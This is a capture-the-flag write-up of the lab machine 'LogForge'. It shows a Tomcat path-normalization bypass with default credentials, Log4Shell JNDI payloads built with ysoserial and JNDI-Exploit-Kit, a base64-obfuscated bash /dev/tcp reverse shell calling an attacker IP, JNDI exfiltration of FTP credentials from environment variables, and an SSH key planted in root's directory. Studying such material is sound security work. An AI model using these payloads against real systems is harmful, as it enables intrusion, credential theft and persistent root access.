# LogForge

```bash
TARGET=10.10.11.138
```

```bash
$ sudo nmap -v -sC -sV $TARGET
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-10 20:16 PDT
...
Nmap scan report for 10.10.11.138
Host is up (0.093s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE    SERVICE    VERSION
21/tcp   filtered ftp
22/tcp   open     ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp   open     http       Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Ultimate Hacking Championship
8080/tcp filtered http-proxy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
Nmap done: 1 IP address (1 host up) scanned in 14.71 seconds
           Raw packets sent: 1077 (47.364KB) | Rcvd: 1068 (42.716KB)
```

```bash
$ curl -I $TARGET
HTTP/1.1 200 
Date: Sun, 11 Aug 2024 03:17:57 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html;charset=UTF-8
Transfer-Encoding: chunked
Set-Cookie: JSESSIONID=A9E29A441BD50BB6EEB51D49F5515040; Path=/; HttpOnly
```

The main page shows the following

![WebPage](images/port_80_webpage.png)

But an error page shows we have `Tomcat 9.0.31` here.

![WebPage - Error - Tomcat](images/port_80_tomcat_error.png)

From `nmap` we know that we have `Apache httpd 2.4.41` serving this port.

This DEFCON presentation is a good one to ref on this case here:

- [Orange Tsai's famous Breaking Parser Logic! presentation](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)

This is a good slide for what we have here - `Apache` and `Tomcat`

![defcon presentation](images/defcon_presentation.png)

```bash
/..;/
```

```bash
http://10.10.11.138/kali/..;/manager/html
```

![Tomcat login](images/tomcat_login.png)

| Username | Password | Target |
| -- | -- | -- |
| tomcat | tomcat | Tomcat manager |

![Tomcat Manager](images/tomcat_manager.png)

```bash
$ msfvenom -p java/shell_reverse_tcp lhost=10.10.14.3 lport=443 -f war -o rev.war
Payload size: 12803 bytes
Final size of war file: 12803 bytes
Saved as: rev.war
```

![Tomcat -WAR upload limit](images/tomcat_war_upload_error.png)

```bash
FAIL - Deploy Upload Failed, Exception: [org.apache.tomcat.util.http.fileupload.impl.FileSizeLimitExceededException: The field deployWar exceeds its maximum permitted size of 1 bytes.]
```

## Log4j - Log4Shell

The idea here is to try a log4j jndi payload here and see if we get a connection back on ldap port TCP 389.

```bash
$ nc -nlvp 389
```

```bash
${jndi:ldap://10.10.14.3/file}
```

```bash
POST /kali/..;/manager/html/expire?path=/UHC%7BBadWayToBlockTomcat%7D HTTP/1.1
Host: 10.10.11.138
Content-Type: application/x-www-form-urlencoded
Authorization: Basic dG9tY2F0OnRvbWNhdA==

idle=${jndi:ldap://10.10.14.3/file}
```

![Log4j Burp Test](images/log4j_burp_test.png)

![Log4j NC Test](images/log4j_nc_test.png)

```bash
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: 10.10.11.138' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Authorization: Basic dG9tY2F0OnRvbWNhdA==' \
    --data-binary $'idle=${jndi:ldap://10.10.14.3/file}' \
    $'http://10.10.11.138/kali/..;/manager/html/expire?path=/UHC%7BBadWayToBlockTomcat%7D'

```

```bash
$ curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: 10.10.11.138' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Authorization: Basic dG9tY2F0OnRvbWNhdA==' \
    --data-binary $'idle=${jndi:ldap://10.10.14.3/file}' \
    $'http://10.10.11.138/kali/..;/manager/html/expire?path=/UHC%7BBadWayToBlockTomcat%7D'
```

```bash
$ nc -nlvp 389
listening on [any] 389 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.138] 35994
0
 `
```

Ok, now we know that this parameter is vulnerable.

We have can exploit this with 2 tools: [ysoserial](https://github.com/frohoff/ysoserial) and [JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit)

The [ysoserial](https://github.com/frohoff/ysoserial) is going to help us to create a Java payload.

To avoid java version problems, we are going to build it on a docker container. Clone it and then build it on docker.

```bash
$ cd /opt/ysoserial

$ docker build . -t ysoserial
Sending build context to Docker daemon  1.004MB
Step 1/14 : FROM maven:3.5-jdk-8 as builder
3.5-jdk-8: Pulling from library/maven
bc9ab73e5b14: Pull complete 
193a6306c92a: Pull complete 
e5c3f8c317dc: Pull complete 
a587a86c9dcb: Pull complete 
a4c7ee7ef122: Pull complete 
a7c0dad691e9: Pull complete 
367a6a68b113: Pull complete 
60c0e52d1ec2: Pull complete 
c9d22bc43935: Pull complete 
41dbcd970503: Pull complete 
72c52bb7e9b7: Pull complete 
275d6d4a835d: Pull complete 
Digest: sha256:b90230c6c65fa00b3404555ad9d3a131101cef791e5583aab18ac420def7d6bb
Status: Downloaded newer image for maven:3.5-jdk-8
 ---> 985f3637ded4
Step 2/14 : WORKDIR /app
 ---> Running in 766192233b70
Removing intermediate container 766192233b70
 ---> 6a73b8183e9b
Step 3/14 : COPY pom.xml .
 ---> be69ba0dd5c9
Step 4/14 : COPY assembly.xml .
 ---> 18321a7ff01c
Step 5/14 : RUN mvn dependency:resolve
 ---> Running in ba10ff365c38
[INFO] Scanning for projects...


...


[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time: 25.507 s
[INFO] Finished at: 2024-08-11T08:54:05Z
[INFO] ------------------------------------------------------------------------
Removing intermediate container ab840c69ce44
 ---> 38838e3b092e
Step 10/14 : RUN mv target/ysoserial-*all*.jar target/ysoserial.jar
 ---> Running in 5ab7bf127e30
Removing intermediate container 5ab7bf127e30
 ---> 4a48e3082850
Step 11/14 : FROM openjdk:8-jdk-alpine
8-jdk-alpine: Pulling from library/openjdk
e7c96db7181b: Pull complete 
f910a506b6cb: Pull complete 
c2274a1a0e27: Pull complete 
Digest: sha256:94792824df2df33402f201713f932b58cb9de94a0cd524164a0f2283343547b3
Status: Downloaded newer image for openjdk:8-jdk-alpine
 ---> a3562aa0b991
Step 12/14 : WORKDIR /app
 ---> Running in b0a9a1d27f3c
Removing intermediate container b0a9a1d27f3c
 ---> ec6852df9500
Step 13/14 : COPY --from=builder /app/target/ysoserial.jar .
 ---> f86d5d5ebcb6
Step 14/14 : ENTRYPOINT ["java", "-jar", "ysoserial.jar"]
 ---> Running in c28a2555879b
Removing intermediate container c28a2555879b
 ---> 4b8957a35cac
Successfully built 4b8957a35cac
Successfully tagged ysoserial:latest
```

Now we can create a payload, and we are going to create ping back to our machine.

```bash
$ docker run ysoserial CommonsCollections5 'ping -c 1 10.10.14.3' > ~/Desktop/HTB/LogForge/ping.ser
```

The [JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit) is somehow broken, because of that I decided to use a previous version.

```bash
$ cd /opt/JNDI-Exploit-Kit

git log
commit e464facbc761a1b3530181a6f37c95925c197551 (HEAD -> master, origin/master, origin/HEAD)
Author: Marcio <almeida@canva.com>
Date:   Tue Jan 11 17:21:45 2022 +1100

    adding credits section

commit 428e782f386274ca91018f081d6576db00920767
Author: Marcio <almeida@canva.com>
Date:   Tue Jan 11 16:54:01 2022 +1100

    fix readme

commit 2ca240fe3d552c7fb2c3b04e9a457e8c8ae98447
Author: Marcio <almeida@canva.com>
Date:   Tue Jan 11 16:51:30 2022 +1100

    Added full integration with ysoserial payloads.

commit 0b6925d80d453146db917616c521e7fc8419dbf7
Author: Marcio <almeida@canva.com>
Date:   Mon Dec 20 10:42:58 2021 +1100

    adding support to className parameter

commit ebe01035a540e8a9e629b698a91edfa144485928
Author: Marcio <almeida@canva.com>
Date:   Mon Dec 13 23:01:33 2021 +1100

    Added support to LDAP with Java serialized payloads.
```

```bash
$ git checkout 0b6925d80d453146db917616c521e7fc8419dbf7
Note: switching to '0b6925d80d453146db917616c521e7fc8419dbf7'.
...
HEAD is now at 0b6925d adding support to className parameter
```

```bash
$ java -jar /opt/JNDI-Exploit-Kit/target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.3:1389 -P
 ~/Desktop/HTB/LogForge/ping.ser  
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
       _ _   _ _____ _____      ______            _       _ _          _  ___ _   
      | | \ | |  __ \_   _|    |  ____|          | |     (_) |        | |/ (_) |  
      | |  \| | |  | || |______| |__  __  ___ __ | | ___  _| |_ ______| ' / _| |_ 
  _   | | . ` | |  | || |______|  __| \ \/ / '_ \| |/ _ \| | __|______|  < | | __|
 | |__| | |\  | |__| || |_     | |____ >  <| |_) | | (_) | | |_       | . \| | |_ 
  \____/|_| \_|_____/_____|    |______/_/\_\ .__/|_|\___/|_|\__|      |_|\_\_|\__|
                                           | |                                    
                                           |_|               created by @welk1n 
                                                             modified by @pimps 

[HTTP_ADDR] >> 10.10.14.3
[RMI_ADDR] >> 10.10.14.3
[LDAP_ADDR] >> 10.10.14.3
[COMMAND] >> open /System/Applications/Calculator.app
----------------------------JNDI Links---------------------------- 
Target environment(Build in JDK 1.5 whose trustURLCodebase is true):
rmi://10.10.14.3:1099/uxoz0h
ldap://10.10.14.3:1389/uxoz0h
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://10.10.14.3:1099/5lzdqh
ldap://10.10.14.3:1389/5lzdqh
Target environment(Build in JDK 1.6 whose trustURLCodebase is true):
rmi://10.10.14.3:1099/oxlvbs
ldap://10.10.14.3:1389/oxlvbs
Target environment(Build in JDK - (BYPASS WITH EL by @welk1n) whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
rmi://10.10.14.3:1099/utbrbv
Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
rmi://10.10.14.3:1099/oq8ko5
ldap://10.10.14.3:1389/oq8ko5
Target environment(Build in JDK - (BYPASS WITH GROOVY by @orangetw) whose trustURLCodebase is false and have Tomcat 8+ and Groovy in classpath):
rmi://10.10.14.3:1099/3rtywe

----------------------------Server Log----------------------------
2024-08-11 11:09:05 [JETTYSERVER]>> Listening on 10.10.14.3:8180
2024-08-11 11:09:05 [RMISERVER]  >> Listening on 10.10.14.3:1099
2024-08-11 11:09:05 [LDAPSERVER] >> Listening on 0.0.0.0:1389
```

![JNDI-Exploit-kit - ping](images/jndi_ping.png)

Lets start `tcpdump` to monitor `icmp` on the tunnel channel.

```bash
$ sudo tcpdump -n -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

![JNDI - Burp - ping](images/jndi_burp_ping.png)

It worked.

```bash
...
----------------------------Server Log----------------------------
2024-08-11 11:09:05 [JETTYSERVER]>> Listening on 10.10.14.3:8180
2024-08-11 11:09:05 [RMISERVER]  >> Listening on 10.10.14.3:1099
2024-08-11 11:09:05 [LDAPSERVER] >> Listening on 0.0.0.0:1389
2024-08-11 11:09:41 [LDAPSERVER] >> Send LDAP object with serialized payload: ACED00057372002E6A617661782E6D616E6167656D656E742E42616441747472696275746556616C7565457870457863657074696F6ED4E7DAAB632D46400200014C000376616C7400124C6A6176612F6C616E672F4F626A6563743B787200136A6176612E6C616E672E457863657074696F6ED0FD1F3E1A3B1CC4020
...
```

```bash
$ sudo tcpdump -n -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
11:09:42.066879 IP 10.10.11.138 > 10.10.14.3: ICMP echo request, id 1, seq 1, length 64
11:09:42.066917 IP 10.10.14.3 > 10.10.11.138: ICMP echo reply, id 1, seq 1, length 64
^C
2 packets captured
2 packets received by filter
0 packets dropped by kernel
```

Lets create a reverse shell payload.

```python
import base64

def generate_revshell(ip, port):
    rev_shell_command = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    encoded_rev_shell_command = base64.b64encode(rev_shell_command.encode()).decode()
    return f'bash -c echo${{IFS}}{encoded_rev_shell_command}|base64${{IFS}}-d|bash'

print(generate_revshell('10.10.14.3', 9999))
```

We need to use the following on `ysoserial`.

```bash
$ /bin/python3.12 /home/kali/Desktop/HTB/LogForge/gen_shell.py
bash -c echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzk5OTkgMD4mMQ==|base64${IFS}-d|bash
```

Reverse it and you get the payload.

```bash
$ echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzk5OTkgMD4mMQ== | base64 -d  
bash -i >& /dev/tcp/10.10.14.3/9999 0>&1
```

```bash
$ docker run ysoserial CommonsCollections5 'bash -c echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzk5OTkgMD4mMQ==|base64${IFS}-d|bash' > ~/Desktop/HTB/LogForge/shell.ser
```

```bash
$ java -jar /opt/JNDI-Exploit-Kit/target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.3:1389 -P ~/Desktop/HTB/LogForge/shell.ser 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
       _ _   _ _____ _____      ______            _       _ _          _  ___ _   
      | | \ | |  __ \_   _|    |  ____|          | |     (_) |        | |/ (_) |  
      | |  \| | |  | || |______| |__  __  ___ __ | | ___  _| |_ ______| ' / _| |_ 
  _   | | . ` | |  | || |______|  __| \ \/ / '_ \| |/ _ \| | __|______|  < | | __|
 | |__| | |\  | |__| || |_     | |____ >  <| |_) | | (_) | | |_       | . \| | |_ 
  \____/|_| \_|_____/_____|    |______/_/\_\ .__/|_|\___/|_|\__|      |_|\_\_|\__|
                                           | |                                    
                                           |_|               created by @welk1n 
                                                             modified by @pimps 

[HTTP_ADDR] >> 10.10.14.3
[RMI_ADDR] >> 10.10.14.3
[LDAP_ADDR] >> 10.10.14.3
[COMMAND] >> open /System/Applications/Calculator.app
----------------------------JNDI Links---------------------------- 
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://10.10.14.3:1099/mocwwp
ldap://10.10.14.3:1389/mocwwp
Target environment(Build in JDK - (BYPASS WITH EL by @welk1n) whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
rmi://10.10.14.3:1099/wbxxju
Target environment(Build in JDK 1.6 whose trustURLCodebase is true):
rmi://10.10.14.3:1099/w3npyd
ldap://10.10.14.3:1389/w3npyd
Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
rmi://10.10.14.3:1099/2h1sjj
ldap://10.10.14.3:1389/2h1sjj
Target environment(Build in JDK 1.5 whose trustURLCodebase is true):
rmi://10.10.14.3:1099/xjlci1
ldap://10.10.14.3:1389/xjlci1
Target environment(Build in JDK - (BYPASS WITH GROOVY by @orangetw) whose trustURLCodebase is false and have Tomcat 8+ and Groovy in classpath):
rmi://10.10.14.3:1099/gj0p5q

----------------------------Server Log----------------------------
2024-08-11 13:01:31 [JETTYSERVER]>> Listening on 10.10.14.3:8180
2024-08-11 13:01:31 [RMISERVER]  >> Listening on 10.10.14.3:1099
2024-08-11 13:01:32 [LDAPSERVER] >> Listening on 0.0.0.0:1389
```

```bash
$ rlwrap -cAr nc -nlvp 9999               
listening on [any] 9999 ...
```

```bash
$ curl --path-as-is -i -s -k -X $'POST' \    -H $'Host: 10.10.11.138' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Authorization: Basic dG9tY2F0OnRvbWNhdA==' \
    --data-binary $'idle=${jndi:ldap://10.10.14.3:1389/mocwwp}' \
    $'http://10.10.11.138/kali/..;/manager/html/expire?path=/'


HTTP/1.1 200 
Date: Tue, 13 Aug 2024 05:59:30 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html;charset=utf-8
Vary: Accept-Encoding
Transfer-Encoding: chunked
...
```

```bash
$ rlwrap -cAr nc -nlvp 9999               
listening on [any] 9999 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.138] 55492
bash: cannot set terminal process group (787): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@LogForge:/var/lib/tomcat9$ id
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

```bash
tomcat@LogForge:/tmp$ uname -a
Linux LogForge 5.4.0-77-generic #86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

```bash
tomcat@LogForge:/tmp$ cat /etc/os-release
cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.3 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.3 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
```

```bash
tomcat@LogForge:/var/lib/tomcat9$ ps -ef --forest
UID          PID    PPID  C STIME TTY          TIME CMD
...
root         768       1  0 03:31 ?        00:00:00 /usr/sbin/cron -f
root         944     768  0 03:32 ?        00:00:00  \_ /usr/sbin/CRON -f
root         945     944  0 03:32 ?        00:00:00      \_ /bin/sh -c /root/run.sh
root         946     945  0 03:32 ?        00:00:00          \_ /bin/bash /root/run.sh
root         947     946  0 03:32 ?        00:00:12              \_ java -jar /root/ftpServer-1.0-SNAPSHOT-all.jar
...
```

```bash
tomcat@LogForge:/var/lib/tomcat9$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      789/java            
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
```

```bash
tomcat@LogForge:/$ ls -lha
...
drwxr-xr-x   1 root root 3.2K Dec 21  2021 etc
-rw-r--r--   1 root root 2.0M Dec 18  2021 ftpServer-1.0-SNAPSHOT-all.jar
drwxr-xr-x   1 root root    6 Jul  2  2021 home
...
```

```bash
$ nc -nlvp 9001 > ftpServer.jar
listening on [any] 9001 ...
```

```bash
$ nc 10.10.14.2 9001 < ftpServer-1.0-SNAPSHOT-all.jar
...
```

```bash
$ nc -nlvp 9001 > ftpServer.jar
listening on [any] 9001 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.138] 35506
^C
```

```bash
tomcat@LogForge:/$ md5sum ftpServer-1.0-SNAPSHOT-all.jar
abd783cb9ebfb7d23a8842ab2ac48dae  ftpServer-1.0-SNAPSHOT-all.jar
```

```bash
$ md5sum ftpServer.jar 
abd783cb9ebfb7d23a8842ab2ac48dae  ftpServer.jar
```

```bash
$ /opt/jd-gui/jd-gui.jar
...
```

![FTP jar](images/ftp_jar.png)

![FTP variables](images/ftp_variables.png)

```bash
${jndi:ldap://10.10.14.2:1389/ftp_user:${env:ftp_user}}
```

```bash
tomcat@LogForge:/var/lib/tomcat9$ ftp localhost
ftp localhost
Connected to localhost.
220 Welcome to the FTP-Server
Name (localhost:tomcat): ${jndi:ldap://10.10.14.2:1389/ftp_user:${env:ftp_user}}
${jndi:ldap://10.10.14.2:1389/ftp_user:${env:ftp_user}}
530 Not logged in
Login failed.
Remote system type is FTP.
ftp>
```

![FTP user](images/ftp_user.png)

```bash
ftp_user:ippsec
```

```bash
${jndi:ldap://10.10.14.2:1389/ftp_password:${env:ftp_password}}
```

```bash
tomcat@LogForge:/var/lib/tomcat9$ ftp localhost
ftp localhost
Connected to localhost.
220 Welcome to the FTP-Server
Name (localhost:tomcat): ${jndi:ldap://10.10.14.2:1389/ftp_password:${env:ftp_password}}
${jndi:ldap://10.10.14.2:1389/ftp_password:${env:ftp_password}}
530 Not logged in
Login failed.
Remote system type is FTP.
```

![FTP password](images/ftp_password.png)

```bash
ftp_password:log4j_env_leakage
```

```bash
tomcat@LogForge:/tmp$ ftp localhost
ftp localhost
Connected to localhost.
220 Welcome to the FTP-Server
Name (localhost:tomcat): ippsec
ippsec
331 User name okay, need password
Password: log4j_env_leakage

230-Welcome to HKUST
230 User logged in successfully
Remote system type is FTP.
ftp> 
```

| Username | Password | Target |
| -- | -- | -- |
| tomcat | tomcat | Tomcat manager |
| ippsec | log4j_env_leakage | ftp |

We know the FTP server is running as root and we can see the files on root's directory.

```bash
ftp> ls
ls
200 Command OK
125 Opening ASCII mode data connection for file list.
.profile
.ssh
snap
ftpServer-1.0-SNAPSHOT-all.jar
.bashrc
.selected_editor
run.sh
.lesshst
.bash_history
root.txt
.viminfo
.cache
226 Transfer complete.
```

```bash
ftp> pwd
pwd
257 "/root"
```

After playing a bit, we can see and download many of the files, but we cannot delete, rename or append anything on the existing files. However we can upload new files.

```bash
tomcat@LogForge:/tmp$ echo "test" > kali.txt
echo "test" > kali.txt
```

```bash
ftp> put kali.txt
put kali.txt
local: kali.txt remote: kali.txt
200 Command OK
150 Opening ASCII mode data connection for requested file kali.txt
226 File transfer successful. Closing data connection.
6 bytes sent in 0.00 secs (344.6691 kB/s)
```

As we already see an `authorized_keys` on the `.ssh` directory, we cound add our on key on a `authorized_keys2` file and upload it.

```bash
ftp> cd .ssh
cd .ssh
250 The current directory has been changed to /root/.ssh

ftp> put authorized_keys2
put authorized_keys2
local: authorized_keys2 remote: authorized_keys2
200 Command OK
150 Opening ASCII mode data connection for requested file authorized_keys2
226 File transfer successful. Closing data connection.
92 bytes sent in 0.00 secs (3.1335 MB/s)

ftp> ls
ls
200 Command OK
125 Opening ASCII mode data connection for file list.
authorized_keys
id_rsa
known_hosts
authorized_keys2
226 Transfer complete.
```

```bash
$ ssh -i ~/.ssh/kali-rsa root@$TARGET       
Enter passphrase for key '/home/kali/.ssh/kali-rsa': 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)
...
Last login: Tue Dec 21 15:10:37 2021

root@LogForge:~# id
uid=0(root) gid=0(root) groups=0(root)
```
